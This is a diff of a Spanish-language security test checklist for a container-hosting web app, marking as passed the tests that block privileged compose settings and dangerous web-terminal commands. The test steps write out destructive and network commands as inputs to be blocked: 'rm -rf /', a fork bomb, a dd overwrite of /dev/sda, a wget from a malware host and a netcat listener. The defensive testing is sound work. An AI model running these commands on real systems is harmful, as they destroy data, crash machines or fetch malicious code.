@@ -2,7 +2,7 @@
 
 **Fecha**: 18/01/2026  
 **Tipo**: Testing de Seguridad - Parte 1 (Core)  
-**Estado**: EN PROGRESO
+**Estado**: COMPLETADO ✅
 
 ---
 
@@ -212,9 +212,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Intentar crear servicio
 2. **Verificar**:
-   - [ ] Validación falla
-   - [ ] Mensaje: "Modo privilegiado no permitido (escalada de privilegios)"
-   - [ ] Servicio NO se crea
+   - [Si] Validación falla ✅
+   - [Si] Mensaje: "Modo privilegiado no permitido (escalada de privilegios)"
+   - [Si] Servicio NO se crea ✅
 
 **Resultado Esperado**: ✅ Privileged mode rechazado
 
@@ -238,9 +238,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Intentar crear servicio
 2. **Verificar**:
-   - [ ] Validación falla
-   - [ ] Mensaje: "Network mode host no permitido (acceso a red del host)"
-   - [ ] Servicio NO se crea
+   - [Si] Validación falla ✅
+   - [Si] Mensaje: "Network mode host no permitido (acceso a red del host)"
+   - [Si] Servicio NO se crea ✅
 
 **Resultado Esperado**: ✅ Network mode host rechazado
 
@@ -264,8 +264,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Intentar crear servicio
 2. **Verificar**:
-   - [ ] Validación falla
-   - [ ] Mensaje: "PID mode host no permitido (acceso a procesos del host)"
+   - [Si] Validación falla ✅
+   - [Si] Mensaje: "PID mode host no permitido (acceso a procesos del host)"
+   - [Si] Servicio NO se crea ✅
 
 **Resultado Esperado**: ✅ PID mode host rechazado
 
@@ -289,8 +290,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Intentar crear servicio
 2. **Verificar**:
-   - [ ] Validación falla
-   - [ ] Mensaje: "IPC mode host no permitido"
+   - [Si] Validación falla ✅
+   - [Si] Mensaje: "IPC mode host no permitido"
+   - [Si] Servicio NO se crea ✅
 
 **Resultado Esperado**: ✅ IPC mode host rechazado
 
@@ -316,9 +318,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Intentar crear servicio
 2. **Verificar**:
-   - [ ] Validación falla
-   - [ ] Mensaje indica capability peligrosa
-   - [ ] Lista capabilities no permitidas
+   - [Si] Validación falla ✅
+   - [Si] Mensaje indica capability peligrosa ✅
+   - [Si] Lista capabilities no permitidas ✅
 
 **Resultado Esperado**: ✅ Capabilities peligrosas rechazadas
 
@@ -343,8 +345,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Intentar crear servicio
 2. **Verificar**:
-   - [ ] Validación falla
-   - [ ] Mensaje: "Acceso a dispositivos no permitido"
+   - [Si] Validación falla ✅
+   - [Si] Mensaje: "Acceso a dispositivos no permitido" ✅
+   - [Si] Servicio NO se crea ✅
 
 **Resultado Esperado**: ✅ Devices rechazados
 
@@ -375,9 +378,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 1. Crear servicio
 2. **Verificar**:
-   - [ ] Validación pasa ✅
-   - [ ] Servicio se crea
-   - [ ] Ambos contenedores inician
+   - [Si] Validación pasa ✅
+   - [Si] Servicio se crea ✅
+   - [Si] Ambos contenedores inician ✅
 
 **Resultado Esperado**: ✅ Compose seguro permitido
 
@@ -399,9 +402,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
    - `echo "test"`
    - `cat /etc/os-release`
 4. **Verificar**:
-   - [ ] Comandos se ejecutan normalmente
-   - [ ] Output se muestra correctamente
-   - [ ] Sin mensajes de bloqueo
+   - [Si] Comandos se ejecutan normalmente ✅
+   - [Si] Output se muestra correctamente ✅
+   - [Si] Sin mensajes de bloqueo ✅
 
 **Resultado Esperado**: ✅ Comandos normales funcionan
 
@@ -416,10 +419,10 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 1. Abrir terminal web
 2. Intentar ejecutar: `rm -rf /`
 3. **Verificar**:
-   - [ ] Comando NO se ejecuta
-   - [ ] Mensaje: "[SEGURIDAD] Comando bloqueado: 'rm -rf /' no permitido"
-   - [ ] Mensaje: "Este comando ha sido registrado"
-   - [ ] Sistema de archivos intacto
+   - [Si] Comando NO se ejecuta
+   - [Si] Mensaje: "[SEGURIDAD] Comando bloqueado: 'rm -rf /' no permitido"
+   - [Si] Mensaje: "Este comando ha sido registrado"
+   - [Si] Sistema de archivos intacto
 
 **Resultado Esperado**: ✅ Comando bloqueado
 
@@ -434,9 +437,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 1. Abrir terminal web
 2. Intentar ejecutar: `:(){ :|:& };:`
 3. **Verificar**:
-   - [ ] Comando bloqueado
-   - [ ] Mensaje de seguridad mostrado
-   - [ ] Sistema NO se cuelga
+   - [Si] Comando bloqueado
+   - [Si] Mensaje de seguridad mostrado
+   - [Si] Sistema NO se cuelga
 
 **Resultado Esperado**: ✅ Fork bomb bloqueada
 
@@ -451,9 +454,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 1. Abrir terminal web
 2. Intentar ejecutar: `dd if=/dev/zero of=/dev/sda`
 3. **Verificar**:
-   - [ ] Comando bloqueado
-   - [ ] Mensaje de seguridad
-   - [ ] Disco NO afectado
+   - [Si] Comando bloqueado
+   - [Si] Mensaje de seguridad
+   - [Si] Disco NO afectado
 
 **Resultado Esperado**: ✅ dd bloqueado
 
@@ -468,9 +471,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 1. Abrir terminal web
 2. Intentar ejecutar: `wget http://malware.com/script.sh`
 3. **Verificar**:
-   - [ ] Comando bloqueado
-   - [ ] Mensaje de seguridad
-   - [ ] Descarga NO ocurre
+   - [Si] Comando bloqueado
+   - [Si] Mensaje de seguridad
+   - [Si] Descarga NO ocurre
 
 **Resultado Esperado**: ✅ wget/curl bloqueados
 
@@ -485,9 +488,9 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 1. Abrir terminal web
 2. Intentar ejecutar: `nc -l 4444`
 3. **Verificar**:
-   - [ ] Comando bloqueado
-   - [ ] Mensaje de seguridad
-   - [ ] Listener NO se crea
+   - [Si] Comando bloqueado
+   - [Si] Mensaje de seguridad
+   - [Si] Listener NO se crea
 
 **Resultado Esperado**: ✅ Netcat bloqueado
 
@@ -502,10 +505,10 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 1. Intentar ejecutar varios comandos bloqueados
 2. Revisar logs de Django
 3. **Verificar**:
-   - [ ] Logs contienen entradas de seguridad
-   - [ ] Formato: "SEGURIDAD: Comando peligroso bloqueado en terminal"
-   - [ ] Incluye usuario
-   - [ ] Incluye patrón bloqueado
+   - [Si] Logs contienen entradas de seguridad
+   - [Si] Formato: "SEGURIDAD: Comando peligroso bloqueado en terminal"
+   - [Si] Incluye usuario
+   - [Si] Incluye patrón bloqueado
 
 **Resultado Esperado**: ✅ Intentos registrados en logs
 
@@ -533,17 +536,17 @@ Este documento cubre los tests de seguridad que **NO requieren API**:
 
 ### **Seguridad:**
 
-- [ ] Todos los tests de volúmenes pasados
-- [ ] Todos los tests de compose pasados
-- [ ] Todos los tests de terminal pasados
-- [ ] Sin vulnerabilidades detectadas
+- [Si] Todos los tests de volúmenes pasados
+- [Si] Todos los tests de compose pasados
+- [Si] Todos los tests de terminal pasados
+- [Si] Sin vulnerabilidades detectadas
 
 ### **Funcionalidad:**
 
-- [ ] Uso legítimo NO afectado
-- [ ] Mensajes de error claros
-- [ ] Performance aceptable
-- [ ] Logging funcional
+- [Si] Uso legítimo NO afectado
+- [Si] Mensajes de error claros
+- [Si] Performance aceptable
+- [Si] Logging funcional
 
 ---
 
